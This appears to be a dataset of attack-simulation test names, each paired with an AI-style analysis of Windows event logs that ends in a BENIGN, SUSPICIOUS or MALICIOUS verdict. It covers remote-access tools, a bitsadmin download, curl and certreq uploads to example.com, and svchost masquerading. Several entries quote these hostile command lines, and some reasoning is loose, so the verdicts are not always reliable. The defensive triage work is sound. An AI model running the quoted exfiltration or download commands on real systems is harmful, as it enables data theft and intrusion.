2. **Installation of GoTo Opener and GoToAssist**: Multiple entries indicate that both `GoTo Opener` and `GoToAssist` are being installed. This could be part of a legitimate IT support process, but it is concerning if initiated without end-user or IT department approval.

3. **Process Execution**: There are multiple instances of `cmd.exe` and `conhost.exe` invoked by `GoToAssist.exe`. These can be legitimate, but when coupled with the PowerShell download, they become suspicious activities to verify if they align with expected usage patterns.

4. **Elevated Privileges**: The events include logs indicating the usage of an elevated token (privileges such as `SeDebugPrivilege`) by the user `admin_test`, which often requires close scrutiny as it could be used for privilege escalation tactics if not intended as part of regular operations.

5. **Network and System Changes**: Multiple logs involving processes like `svchost.exe` adjusting times or certain system settings could potentially be benign but should be investigated for abnormal behavior or settings.

### Potential Indicators of Malicious Activity

- **Download and Execution of Remote Support Tools**: The use of PowerShell to download and execute potentially powerful remote access software like GoToAssist should be verified with IT policies. If unauthorized, it could represent a security risk allowing external access to the machine.

- **Command Execution via PowerShell and Batch Scripts**: Such patterns may indicate scripts being run to perform administrative tasks or even deliver a payload, and should be confirmed under a security change management process.

### Threats or Risks Identified

- Unauthorized remote access tools installation could enable external entities to gain control over the system.
- Elevated privileges used by the session indicate potential for privilege escalation attacks if not managed securely.
  
### Recommended Actions

- **Verification**: Confirm with the IT team if the installation and use of GoToAssist and related software were approved and part of an expected IT support action.
- **Review PowerShell Scripts**: Investigate scripts running via PowerShell for unusual commands, especially those downloading external files.
- **Audit User Activity**: Review `admin_test` and other user activities for compliance with security policies, specifically regarding privileged access and execution actions.

### Final Assessment

Given the evidence and analyses, the situation should be classified as **SUSPICIOUS**. The activities don't outright appear malicious but are potentially risky enough to warrant further investigation to ensure they are legitimate and authorized actions within the company's security policy framework."
Ammyy Admin Software Execution,"Upon careful analysis of the provided Windows event logs, the following observations and assessments have been made:

### Indicators of Suspicious or Malicious Activity:

1. **PowerShell Execution**: 
   - Multiple entries in both the Sysmon and PowerShell logs indicate the execution of `powershell.exe` with the command line containing `Start-Process` to execute `ammyy.exe` from a temporary directory.
   - Path: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\ammyy.exe\""`
   - This behavior is suspicious because the use of PowerShell to execute executables located in temporary directories, especially using `ammyy.exe`, which is a known remote administration tool, could indicate an attempt to establish unauthorized remote access.

2. **Anomalous Process Activity**:
   - Several Sysmon logs capture processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe`, which are often leveraged in living-off-the-land attacks or reconnaissance activities within an environment.
   - The repeated spawning of `conhost.exe` alongside tools that are used for viewing event logs or checking user privileges (`whoami.exe`) could suggest enumeration attempts.

3. **Edge Update Process**:
   - Several instances of `MicrosoftEdgeUpdate` processes running with various command-line arguments (`/update`, `/svc`, `/regserver`) and originating from `Microsoft\\Temp\\EUEEEA.tmp`.
   - While updates for legitimate software like Microsoft Edge can occur, the use of temporary directories and multiple registrations appears unusual and warrants examination for potentially compromised updates or misconfigurations.

### Assessment:

Given the outlined observations, the logs contain a suspicious blend of process execution, particularly involving PowerShell and executables in a temporary directory hinting toward unauthorized remote control tools. The consistent use of PowerShell to execute potential remote access software (`ammyy.exe`) and the context of administrative user operations (`SERVER002\\admin_test`) without clear authorization provides strong indications of suspicious activity that could be part of a larger malicious campaign or compromise.

### Recommended Resolution:

**Resolution**: **SUSPICIOUS**

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected machine (Server002) to prevent potential lateral movement or data exfiltration.
   - Investigate the `ammyy.exe` file in the temporary directory. Assess when it was placed there and by whom.
  
2. **Further Investigation**:
   - Review user account activity, focusing on the `admin_test` account for any unauthorized access.
   - Perform a deeper analysis of network traffic during this time frame to identify any unusual connections.

3. **Remediation**:
   - If confirmed malicious, remove unauthorized files and clean infections.
   - Update and enforce security measures, including endpoint detection and response capabilities, to prevent similar occurrences in the future.

4. **Forensic Analysis**:
   - Conduct full disk imaging and memory dumps to gather evidence if required for a post-incident report or potential legal purposes."
UltraViewer - RAT Execution,"Upon reviewing the provided Windows event logs, several indicators and patterns of activity may suggest potential malicious actions:

1. **Process Execution:**
   - Multiple executions of `powershell.exe` and `wevtutil.exe` which are typical tools used by attackers for reconnaissance and removal of event logs.
   - Execution of `UltraViewer_Desktop.exe` and related processes from non-standard locations like temporary directories and with command-line arguments such as `/silent` which may indicate an unauthorized remote access tool installation or execution.

2. **Persistence Mechanisms:**
   - The installation and configuration of the ""UltraViewer Service"" which is set to auto-start. This suggests an attempt to maintain persistence on the system. The modification of system services can be typical of malicious actions to ensure remote access or maintain the presence of malware.

3. **Process Tree and Anomalies:**
   - Various taskkill commands executed targeting `UltraViewer_Desktop.exe` and `UltraViewer_Service.exe`. This behavior can indicate a struggle for process control often seen in post-compromise operations.
   - Repeated registration (`regasm.exe`) of .NET assemblies related to `UltraViewer`, potentially attempting to integrate the malicious tool into the system more deeply or hide it.

4. **User Privileges and Security Events:**
   - The logs indicate privileged operations by the `admin_test` user. While elevated privileges can be typical in administrative operations, in the context of other suspicious activities, this could denote an account compromise.

5. **Network Activity:**
   - The logging and security records display connections from external IPs and use of NTLM for authentication, which could indicate an attempted lateral movement or external command and control connection.

6. **Behavioral Indicators:**
   - The sequence of events, including the launch, installation, repeated termination, and registration processes around `UltraViewer` applications, are highly suspicious. UltraViewer is a legitimate remote access application, but its mention in the context of atypical directories and accompanied by command-line executions suggests possible misuse for remote access by an unauthorized entity.

**Conclusion:**

Based on the collected evidence, there's a strong indication of malicious activity centered around the unauthorized installation and potential use of UltraViewer for remote access. The telemetry suggests attempts to gain persistence, possible reconnaissance, and the execution of suspicious processes.

**Resolution:** MALICIOUS

**Guidance for Proceeding:**
- Immediate isolation of the affected system to prevent further potential exfiltration or lateral movement.
- Comprehensive malware scan and removal.
- Forensic investigation to confirm the breach and understand the scope.
- Review and strengthen network and endpoint monitoring.

- Incident response team engagement and communication with stakeholders about the compromise."
RemotePC Software Execution,"After examining the Windows event logs from the supplied data, several points merit attention concerning potential indicators of malicious activity:

### Analysis:
1. **PowerShell Execution**
   - Consistently, logs show the execution of PowerShell scripts, notably launching a file named 'RemotePC.exe' from a temporary directory (C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\RemotePC.exe). Utilizing temporary directories for executable deployment can be indicative of suspicious activity, especially if it's not part of the typical behavior in the environment.

2. **RemotePC Installations and Executions**
   - There are numerous instances of processes being executed that relate to the RemotePC software, such as 'RemotePCService.exe', 'RPCDownloader.exe', 'RemotePCLauncher.exe', among others. Though RemotePC is legitimate software, its use without administrative intent can imply unauthorized remote access capabilities.

3. **Service Installation**
   - A new service, 'RPCService', has been registered and set to auto-start using 'RemotePCService.exe'. Creating new, auto-start services, especially with LocalSystem privileges, can be a technique used by attackers for persistence.

4. **Privilege Escalation and Use of System Processes**
   - Several logs indicate privilege usage events with high integrity levels, indicating that privileged processes were executed in conjunction with the aforementioned suspicious files.

5. **Presence of Multiple Installers and Ghost Scripts**
   - The Sysmon logs show multiple installer executions like 'msiexec.exe' with removing/installing various components. These actions might represent normal update activities, yet the heavy installer activity aligning with the RemotePC executions can download additional components covertly or destructive software.

### Conclusion:
Considering the repetitive execution of 'RemotePC.exe' and associated services installation aligning with suspicious file path usage, this activity strongly suggests that unauthorized software with potential remote access utilities has been deployed. Given these observations, the events are deemed indicative of potentially malicious activity warranting immediate action.

### Resolution: MALICIOUS
- The logs exhibit clear activities characteristic of unauthorized installation and possibly remote control via RemotePC, supplemented by suspicious service creation and PowerShell execution under a process likely not standard for this environment.

### Recommended Actions:
- **Immediate Investigation and Mitigation**: Investigate the origin of these actions and validate with the system owner if such activities were planned.
- **Isolate the Server**: Isolate the server from the network to prevent further potential compromise.
- **Full Malware and Security Scan**: Conduct a deep system scan for any additional unauthorized software or malware traces.
- **Audit and Remove Unauthorized Connections and Services**: Ensure that any unauthorized services and connections are disabled and removed.
- **Strengthen Access Controls**: Review and possibly tighten access controls, especially around PowerShell and other scripting utilities.
- **User Training and Awareness**: If this software was unauthorized, strengthen user awareness and training regarding security policies and software usage."
Testing usage of uncommonly used port with PowerShell,"**Analysis of Event Logs**

**1. Security Log**
- **Event ID 4624**: These entries indicate successful logons. The logon type 5 refers to a service logon, which is a standard type for server-side processes like services. This indicates normal operations for a server providing services.
- **Event ID 4672**: This indicates special privileges were assigned to a new logon. The SYSTEM account being granted these privileges is normal since these are standard privileges assigned to system-level processes.
- **Event ID 4798**: Enumeration of user accounts. This could indicate reconnaissance activity if the frequency is excessive or tied to suspicious activity. However, the listed accounts seem regular (Administrator, admin_test, etc.) and there are no additional indicators of compromise tied to these events in isolation.

**2. Application Log**
- Entries related to the Software Protection Platform Service (Security-SPP) and Edge updates appear normal for system processes and updates.

**3. Windows PowerShell Log**
- **Event ID 600**: It records the start of PowerShell providers. The command ""Test-NetConnection -ComputerName google.com -port 8081"" suggests network testing or checking connectivity, which can be normal for diagnostics. 

**4. System Log**
- **Event ID 35**: This shows synchronization with a time source, which is typical and expected behavior for maintaining accurate time settings on a server.

**5. Sysmon Log**
- **Event ID 1 & 5**: These entries show process creation events and file hashes for various system processes such as CompatTelRunner.exe, WmiPrvSE.exe, conhost.exe, and EdgeUpdate. The execution and file hashes appear normal, indicating trusted Microsoft binaries and typical operations.

**Suspicious Activity Evaluation:**
- No direct indicators of malicious activity (e.g., known malicious processes, unusual privilege escalations, unknown file paths) were found in these logs.
- User enumeration via Event ID 4798 could suggest suspicious reconnaissance, but without further corroboration, it remains speculative.
- The command ""Test-NetConnection -ComputerName google.com -port 8081"" in the PowerShell logs might warrant follow-up if the port is non-standard for the environment's operation.

**Assessment and Resolution:**
- **BENIGN**: All activities observed in the logs align with typical system operations and administrative tasks. While there is potential room for deeper dive, particularly into the nature of user enumeration, there is no direct indicator of compromise from the provided logs.

**Recommended Guidance:**
- Periodically review user enumeration events for patterns of excessive usage that might suggest malicious reconnaissance.
- Continuously monitor for any deviations in process execution that do not align with baseline system behavior.
- Ensure regular audits of PowerShell usage and network testing commands to ensure they align with expected system diagnostics and are not executed with malicious intent."
UltraVNC Execution,"Upon analysis of the provided event logs from the Windows host, several activities stand out that suggest potential malicious behavior. Here is a breakdown of the observed events:

1. **Installation and Execution of UltraVNC Components:**
   - There are multiple logs indicating the execution of UltraVNC-related applications like `setpasswd.exe`, `setcad.exe`, and `vncviewer.exe`.
   - The use of `netsh.exe` to open firewall ports for VNC on ports 5900 and 5800 is especially concerning. This behavior is indicative of someone trying to establish remote access capabilities on the server.
   - The execution of UltraVNC components silently (`/silent`) suggests attempts to avoid drawing notice from system users or administrators.

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` utility, which is designed for managing Windows Event logs, is invoked several times. While this behavior can be part of normal admin activities, it could also be abused to clear logs or hide traces of malicious activities.

3. **PowerShell Execution:**
   - There is an instance of PowerShell being used to start a process (`Start-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'`). This script execution indicates an attempt to automate or script certain actions, which can be a sign of a script-based attack.

4. **Log History of Network Command Shell (netsh.exe):**
   - Multiple entries of `netsh.exe` indicate that the firewall was instructed to allow certain programs, specifically related to UltraVNC. This manipulation of firewall rules to allow VNC traffic (a common remote access vector) raises red flags about unauthorized remote access setup.

5. **Execution by `admin_test`:**
   - All noted activities were executed under the “SERVER002\admin_test” user, which suggests privilege misuse or possible unauthorized activities carried out under this account.

6. **No Benign Activities or Justifications Found:**
   - There are no corresponding logs or benign justifications that substantiate the necessity for these services (like VNC) on the server. In a controlled and monitored IT environment, unexpected remote access setups demand further investigation.

**Resolution:**
- **MALICIOUS**: The activity documented within these logs presents several strong indicators of compromise, such as attempts to establish unauthorized remote access (via VNC) with firewall adjustments and silent installations. This suggests malicious intent and requires immediate mitigation actions.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Disable any unforeseen remote access settings and executable files related to UltraVNC.
   - Evaluate the necessity of the `admin_test` account, and consider revoking its suspicious access privileges.
   
2. **Investigations:**
   - Conduct deeper forensics analysis on `SERVER002` to trace any potential data breaches.
   - Cross-reference any access logs to identify the origin of these commands and activities (internal or external threat).

3. **Preventive Measures:**
   - Enhance monitoring of privileged account activities and the use of scripting engines like PowerShell.
   - Increase awareness and training for legitimate administrative users to recognize unusual patterns indicative of escalation or misuse.

Given these observations, rapid incident response protocols should be activated to prevent further exploitation."
Psiphon,"Upon review of the provided event logs, let's analyze the key detections and anomalies:

1. **Sysmon Logs:**
   - There are multiple executions of `powershell.exe`, `wevtutil.exe`, `cmd.exe`, and `Psiphon.bat`. These events are initiated by the user ""SERVER002\\admin_test"". The execution of scripts or commands utilizing PowerShell, especially when initiated from temporary directories (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\Psiphon.bat`), can be indicative of potentially unauthorized or malicious activity.
   - The presence of `Psiphon.bat`, a batch script running from a user directory, suggests the execution of scripts that could be related to proxying, tunneling, or circumventing network restrictions, considering that Psiphon is known for such purposes.
   - Conhost and wevtutil execution are often associated with process manipulation or event log tampering, which can also indicate attempts to hide traces of activity.

2. **Security Logs:**
   - We observe success logs for privileged operations and some network logons using the account ""admin_test"". The logon events (4624) and privilege assignments (4672) suggest that there is an account in use with administrative rights which corroborates targeted activity often associated with unauthorized access or privilege escalation attempts.
   
3. **Windows PowerShell Logs:**
   - Execution details convey that PowerShell scripts are utilizing batch files in temporary user directories, which are typically non-standard operating modes for benign administrative tasks.

4. **General Observations:**
   - The behavior found in the logs seems consistent with either post-compromise or lateral movement activities, specifically the privilege workflow and execution of suspicious batch files or scripts.

Based on the analysis:
- The presence of Psiphon and batch execution from a temporary directory, alongside potentially obfuscated or hidden administrative tasks, signal at the very least suspicious behavior.
- The frequent executions of administrative utilities and the privilege elevation events further the suspicion of unauthorized activity aimed at gaining or maintaining persistence.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Investigate the specific batch files and any scripts executed to understand their purpose and functionality.
- Confirm the legitimacy of the ""admin_test"" user's activities during the time frame of the logs.
- Conduct a detailed user behavior analysis to check for unauthorized logins or privilege escalations.
- Implement monitoring for any additional irregular process executions or further signs of compromise.
- Consider isolating the server to prevent potential spread and to conduct a more thorough forensic analysis."
svchost writing a file to a UNC path,"Upon reviewing the provided Windows event logs, several aspects stand out that suggest suspicious and potentially malicious activity.

1. **Unusual Process Execution Patterns**:
    - **Process Cloning**: The command line `\""cmd.exe\"" /c copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe & C:\\svchost.exe /c echo data > \\localhost\\c$\\data.txt` is indicative of an attempt to hide a malicious process under the guise of a legitimate process (svchost.exe). This is a known technique used by attackers to execute unauthorized or malicious activities under the cloak of legitimate processes.
    - **Redirection and Execution**: The redirection and execution through `C:\\svchost.exe` with an unusual command to write data are suspicious. The creation and use of `svchost.exe` in unusual directories and contexts can be an indicator of compromise.

2. **Privilege Escalation**:
    - Multiple entries show the user `admin_test` executing high-integrity level processes. The privilege escalation with tokens like `SeDebugPrivilege` and others in Event ID 4672 suggests that the account has extensive permissions, which might be leveraged for unauthorized activities.

3. **Frequent Use of System Utilities**:
    - Utilities such as `whoami.exe`, `hostname.exe`, and multiple `wevtutil.exe` executions are logged. While these can be typical for administrative tasks, the combination of these processes being executed in quick succession might indicate script or automation used for reconnaissance.
  
4. **Time Discrepancy**
    - There is a modification of the system time as seen in security logs Event ID 4616. Changing system time is a common method used by attackers to manipulate log timestamps and hide their tracks or bypass time-based security measures (e.g., password lockouts).

5. **Reoccurring Processes with Unusual Command Lines**:
    - The recurrence of `MicrosoftEdgeUpdate.exe` with diverse command lines and in various temporary directories suggests the possibility of abuse for persistence or lateral movement within the system.

6. **User Account Activity**:
    - The logs indicate a few NT AUTHORITY operations, such as with `MicrosoftEdgeUpdate.exe` under `NT AUTHORITY\\SYSTEM`. While this can be part of legitimate system updates, the context and the quick succession of operations raise a red flag especially in environments where updates do not occur as frequently.

### Assessment

Based on the review of the event logs, there is strong evidence of suspicious activities that deviate from normal operational behavior and may imply malicious intent. The use of process masquerading, high-level privileges, time manipulation, and repetitive system utilities usage are signs that need an in-depth investigation.

### Recommendation

- **Resolution**: **MALICIOUS**
- Proceed with a comprehensive review of user activities, particularly of the `admin_test` account.
- Investigate the origin and context of the `svchost.exe` file created and executed from non-standard locations.
- Use isolation and further monitoring tools to detect ongoing malicious activities.
- Assess the potential impact and begin incident response procedures, involving endpoint isolation if necessary.
- Ensure all systems are updated with the latest security patches to mitigate known vulnerabilities."
Download a File with Windows Defender MpCmdRun.exe,"After reviewing the provided sets of logs from the Windows host, let's analyze each log type to identify suspicious or malicious activities.

### System Log Analysis:
- The system logs primarily show normal activities related to time synchronization and system events. There are events indicating adjustments to the system time, facilitated by the `svchost.exe` process, which is a common host process for Windows services. This is usually benign unless these actions are taking place excessively or at unusual times, which would necessitate further investigation. In this context, they appear benign given no such pattern is evident in the logs.

### Security Log Analysis:
- The security logs show a standard logon session (Event ID 4624) and a privilege escalation (Event ID 4672) for the `SYSTEM` account. Both are common and typically observed in system operations and maintenance tasks. The presence of high-level privileges might be suspicious if they were unexpected or unexplained, but such access is not unusual for system-level accounts. Lastly, there are time adjustments recorded (Event ID 4616) indicating the system time was set back, which aligns with the system log entries and might be part of normal server synchronization.

### Sysmon Log Analysis:
- Detailed process creation and file access events logged by Sysmon indicate multiple instances of `cmd.exe` being executed with command lines that reference Windows Defender paths. This could be routine depending on context but warrants further investigation if unexpected. 
- Additional processes, such as `MpCmdRun.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, `SecurityHealthService.exe`, and several instances of `MicrosoftEdgeUpdate.exe`, were recorded with various command lines. These activities appear linked to normal system operations, application updates, and security checks, including Microsoft Edge updates.
- A few instances of `conhost.exe` associated with `whoami.exe` and `HOSTNAME.EXE` suggest these commands might be used to gather information about the system or user. While `whoami.exe` activity can be considered normal, if unexpected, it might indicate investigation or reconnaissance activities by an administrator or attacker.
- Notably, updates for Microsoft Edge were frequent, suggesting a regular update cycle or process automation for keeping the application up to date, which generally is benign.

### Application Log Analysis:
- The application logs highlight that the Windows Defender is active, which provides inherent protection against threats.
- There are records of services starting and stopping with `edgeupdate`, potentially related to the update processes observed in the Sysmon logs. Shutdowns and startups of services like these are typical in update processes, especially for a browser.

### Conclusion:
The logs do not display clear signs of malicious behavior or compromise. The activities seen, such as time adjustments, command lines referencing Windows Defender, and Edge Update processes, fit the profile of standard system behavior.

**Resolution: BENIGN**

The activities appear to be normal operational processes. However, you should maintain vigilance by continuing to monitor similar patterns in future logs and comparing them against expected behavior for this environment."
DNS over HTTPS Regular Beaconing,"### Detailed Analysis

Upon reviewing the provided Windows event logs from different channels, several points of interest stand out regarding potentially suspicious activities.

1. **Suspicious PowerShell Invocation**:
   - Multiple entries show PowerShell execution with a specific script (`data-doh-beacon.ps1`) running command containing parameters such as `-DohServer`, `-Domain`, `-Subdomain`, etc. These parameters suggest activity related to DNS over HTTPS (DoH), a technique sometimes employed by malware for command and control (C2) communication. The use of an external server (8.8.8.8/resolve) and a local domain (127.0.0.1.xip.io) as part of the command is typical of malware trying to tunnel or mask its activity.
   - The execution of a PowerShell script from a temporary file directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file`) is a red flag, as it indicates potential fileless malware activity or a dropper script executed directly without saving it on disk.

2. **Process Anomalies**:
   - There are frequent executions of system utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` under the user `SERVER002\admin_test`. While these can be legitimate, their consistent invocation in a short timeframe is unusual unless part of a scripted batch operation or maintenance task.
   - Particularly, the repeated spawning of `HOSTNAME.EXE` and `whoami.exe` might indicate reconnaissance activities. These tools could be employed by an attacker to gather system information.

3. **Privilege Escalation Indicators**:
   - Security logs indicate the `admin_test` account, which has full privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), being used. This account might have been compromised to perform administrative tasks without securing elevated rights through proper authentication channels.
   - The NTLM logon processes from IP `192.168.0.102` and a local link IP `fe80::e3b5:5371:12a8:9c77` are somewhat regular but should be examined if they correlate with expected remote session activities.

4. **Time Skew Events**:
   - System logs indicate a time change executed by a process (`svchost.exe`) suggesting potential time-stomping, which is often used by malicious actors to obfuscate activity traces.

### Assessment and Recommendations

- **Assessment**: The combination of running scripts from a temporary directory, suspicious PowerShell activities, privilege usage, and frequent, seemingly unnecessary process executions points to potentially malicious or exploitative behavior. The exact nature of the PowerShell script is ambiguous in this context but indicates possible malicious intent.
- **Threat/Risk Identification**: Potential risks include data exfiltration, unauthorized command and control activity via DNS over HTTPS, privilege escalation abuse, and system compromise.
- **Guidance**:
  - Immediately isolate the server `Server002` from the network to prevent potential data leakage or further compromise.
  - Conduct a thorough forensic analysis of `Server002`, focusing on memory dump analysis and checking for suspicious network activity or domains.
  - Review and potentially reset credentials for the `admin_test` account and audit other privileged accounts for irregular accesses.
  - Monitor network traffic for similar PowerShell executions or other patterns matching the identified behaviors.
  - Implement stricter PowerShell execution policies and robust endpoint detection solutions to flag similar anomalies in the future.

### Resolution

- **Resolution**: MALICIOUS

The activities described, particularly the use of PowerShell for script execution with C2 communication parameters and frequent execution of reconnaissance and system utilities, strongly suggest malicious activity requiring immediate mitigation and investigation.
"
certreq download,"In this analysis, we focus on identifying any unusual or suspicious behaviors that could indicate malicious activity. Let's break down the key elements observed in the provided logs.

### Suspicious Observations:

1. **Unexpected Command Execution:**
   - In the Sysmon logs, we notice the execution of `cmd.exe` with a command to `certreq.exe`:
     ```
     ""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %%temp%%\file-license.txt
     ```
     - The usage of `certreq.exe` in this manner could be an indicator of a certificate request being sent to an external host (`https://example.com`). Such actions could be leveraged as part of an attack to request certificates illegitimately, potentially to facilitate man-in-the-middle attacks or similar activities.
     
2. **High-Privilege Account Usage:**
   - The user `SERVER002\\admin_test` is associated with executing privileged operations and processes such as `wevtutil.exe` and `conhost.exe`, suggesting that this user has high-level permissions. Repeated mentions of services executing with elevated privileges might indicate misuse or malicious exploitation of a privileged account.

3. **Logs and Audit Events:**
   - Event IDs like `4672` show various privileges being assigned to `admin_test`, which includes critical privileges such as `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeDebugPrivilege`. Such privileges can provide an attacker significant control over the system if exploited.

4. **Process Activity:**
   - Various common system processes (`HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`) are being run in the sequence which might indicate reconnaissance attempts or measures used to mask activities.

5. **Edge Update Activity:**
   - A significant amount of activity from `MicrosoftEdgeUpdate.exe` and its associated processes (`setup.exe`) is observed. Upon inspection, these appear as part of legitimate update mechanisms; however, note should be made that this consistent running might mask other actions leveraging legitimate Windows and Microsoft applications.

### Assessment:

The logs suggest there are indicators that warrant a close inspection, especially the use of PowerShell and command to execute `certreq.exe` against an external site, combined with high privileges granted to a likely compromised account.

### Resolution:

Based on the data provided, my analysis concludes with the following resolution:

- **SUSPICIOUS** - Several indicators suggest that some actions warrant further investigation. The unusual command execution and the privileges used by the `admin_test` account might indicate a potential compromise or misuse of the system.
  
### Guidance on How to Proceed:

1. **Investigate the External Connection:**
   - Analyze network logs to check connections made to `https://example.com`. Assess for any unauthorized data transfers.
   
2. **Examine Credentials and Privileges:**
   - Audit user `SERVER002\\admin_test` for unauthorized privilege escalation. Consider changing credentials and reviewing access logs.
   
3. **Review System Configuration:**
   - Look into Windows Security logs to ensure no unauthorized changes were made to system or security settings.
   
4. **Contain and Eradicate:**
   - If a compromise is suspected, isolate affected systems from the network to prevent further malicious activity, and conduct a thorough malware scan.
   
5. **Issue a Full Incident Response:**
   - Follow a comprehensive incident response plan to determine the full scope of the potential breach or misuse.

By taking these steps, you can mitigate any potential threats and prevent further malicious activity."
Windows - BITSAdmin BITS Download,"Upon reviewing the logs, we need to assess each log entry type for any suspicious or malicious activity:

### Windows Security Log
1. **Events 4616** indicate a time change, possibly due to synchronization or an administrative change. The time updates were minor and appear to originate from `svchost.exe` which is legitimate. These entries alone don't raise concerns unless corroborated by further suspicious behavioral indicators.

### Application Log
2. **Event related to Microsoft-Windows-Security-SPP** and **Edge Update service** stopping typically represent normal operations unless repeatedly failing, which could cause system issues but not necessarily represent malicious activity.
   
### System Log
3. **Kernel-General and Time Service Events** depict time adjustments, likely due to system time synchronization. Given the regularity and lack of associated errors or suspicious process launches, this activity appears benign.

### Sysmon Log
4. **Process Execution by wsmprovhost.exe** and **whoami.exe**: The repeated use of `whoami.exe` for user context confirmation is atypical if executed frequently in non-administrative sessions. Normally, this would be executed if scripts or code checks the current user, which might be suspicious if done repeatedly without clear justification.
   
5. **Cmd.exe executing bitsadmin.exe**: This is a highly unusual activity used to download a file from a remote source using BITSAdmin, a tool often leveraged by attackers to download payloads stealthily. The command line suggests the download of a text file from an external internet source to a temporary directory, executed under an account `admin_test` with high integrity—indicative of an elevated context.

### Summary Assessment
- The main issue arises from the Sysmon log showing `cmd.exe` executing `bitsadmin.exe` with a URL pointing to an internet location. Using `bitsadmin.exe` in this way is a red flag as it is known for being misused in data exfiltration and malicious payload delivery. This particular usage strongly suggests an attempt to download a potentially malicious file.
- The other observed activities involve time synchronization and user context checking, which while worth noting, don’t immediately signal malicious intent without supplementary evidence.

### Resolution
**MALICIOUS:** The entry involving `cmd.exe` and `bitsadmin.exe` is indicative of a potential compromise attempt, or at the very least, unauthorized network access activity that could lead to a security incident. This usage pattern is atypical and aligns with tactics used in attack scenarios.

### Recommendations
1. **Immediate Action**: Isolate the host from the network to prevent potential harm or data exfiltration.
2. **Examine Persistence**: Investigate further for scripts, scheduled tasks, or registry changes that could persist malicious behavior or software.
3. **Backtrace Activities**: Correlate execution paths of suspicious processes to understand scope and impact.
4. **Malware Scanning**: Conduct comprehensive malware scanning to identify potential threats.
5. **Network Monitoring**: Review network traffic for unusual connections, specifically those related to bitsadmin usage patterns.
6. **User Awareness**: Assess whether `admin_test` had a reason to execute such commands, reviewing user actions preceding this event for intentional or coerced account misuse."
MSP360 Connect Execution,"### Analysis:

1. **Windows PowerShell Log:**
   - There is a series of PowerShell events that indicate the execution of `powershell.exe` with the command `Start-Process $env:ProgramFiles\Connect\Connect.exe`. The execution of PowerShell scripts is often used in both legitimate administrative tasks and in malicious attacks.
   - The command executed does not reveal any inherently malicious intent; however, the execution of a Connect.exe file is somewhat unusual and should be verified for the legitimacy of the application.

2. **Application Log:**
   - The logs show the stopping of the `edgeupdate` service, which is consistent with routine system updates or maintenance tasks. This event appears benign as Microsoft Edge regularly updates via this service.

3. **Sysmon Log:**
   - There are multiple process creation events associated with PowerShell, wevtutil.exe, and conhost.exe by the user ""SERVER002\admin_test"". PowerShell usage in conjunction with these utilities warrants closer inspection, as `wevtutil.exe` can be used to query and backup event logs, a potential indicator of post-exploitation activity.
   - Frequent execution of various Microsoft Edge update processes indicates likely routine update operations by `NT AUTHORITY\SYSTEM`, a legitimate process.
   - The execution of `whoami.exe` and `hostname.exe` is often found in script-based recon activities.

4. **Security Log:**
   - The logs provide no entries, which may seem suspicious. The absence might indicate log tampering or simple non-logging of applicable events. Further inspection into system audit policy is advised.

### Assessment:

- Some events in the logs can raise red flags for potential misuse, especially those involving PowerShell and system utilities like `wevtutil.exe`. While there is no explicit sign of malicious activity, the context suggests behavior that warrants further investigation.

- The combination of PowerShell commands and system utilities like `wevtutil` necessitates further validation, especially around the operation of `Connect.exe` and the role of the user ""SERVER002\admin_test"" in these operations.

### Resolution:

**SUSPICIOUS**

### Guidance:

1. **Further Investigation:**
   - Verify the legitimacy of the `Connect.exe` file being executed via PowerShell. Ensure it is a sanctioned application and check its source.
   - Review system policies and configurations to determine if PowerShell usage and utility executions are usual for this system or user account.
   - If possible, conduct a file hash comparison of `Connect.exe` against known malicious file signatures.

2. **Monitoring:**
   - Increase monitoring of the user account ""SERVER002\admin_test"" and any subsequent system changes or process executions, particularly focusing on unauthorized usage of administrative tools.
   - Enable additional logging, especially security logs, to better capture future system activity.

3. **Analysis of Forensics Data:**
   - Consider conducting a deeper forensic analysis of the system to identify any non-logged events and verify if any log tampering might have occurred.

This will help determine if these suspicious activities are part of any obfuscation tactics or legitimate administrative tasks."
Curl Upload File,"Upon reviewing the provided Windows event logs, several activities potentially suggest suspicious or malicious activity:

### Suspicious Activity:
1. **Execution of Curl with Command Line Arguments:**
   - There are multiple instances of `C:\\Windows\\System32\\cmd.exe` executing `curl.exe` with arguments that specify the uploading of a file (`filetestfile.txt`) to an external server (`www.example.com`). 
   - Command run includes both `-T` (for uploading a file) and `--upload-file`, which suggests intentional data exfiltration attempts using `curl`. This behavior is abnormal and noteworthy unless explicitly authorized for remote data uploading.

2. **Use of `wevtutil.exe`:**
   - The presence of multiple `wevtutil.exe` executions indicates potential attempts at manipulating or clearing event logs. This behavior may be employed by adversaries to cover their tracks.

3. **Repeated Edge Update Processes:**
   - Numerous entries associated with `MicrosoftEdgeUpdate.exe` suggest repetitive installation and update actions. Although updates are standard for software maintenance, the consistency and timing (frequent executions in quick succession) need closer review. These could potentially be used as decoys or in case of a compromised update/installer mechanism.

4. **`whoami.exe` Execution:**
   - The `whoami.exe` process was executed. While this command is used to display user information, it can also be utilized by an attacker post-compromise to understand the current user context and available privileges.

### Malicious Indicators:
- The combination of `curl.exe` being used to upload files to an external domain and repeated usage of `wevtutil.exe` without legitimate justification strongly suggests potential malicious activity aimed at data exfiltration and log manipulation to cover tracks.

### Resolution:
Based on the analysis, the activities identified are clearly indicative of malicious behavior because of the attempted unauthorized data upload to an external source and potential log cleansing using system tools. Therefore, the resolution is:

**Resolution: MALICIOUS**

### Recommendations:
1. **Immediate Actions:**
   - Isolate the affected host (`Server002`) from the network to prevent further data exfiltration or lateral movement.
   - Perform a full malware scan on the host to identify and remove any infections.
   - Alert the IT and security teams for immediate incident response measures.

2. **Investigation and Containment:**
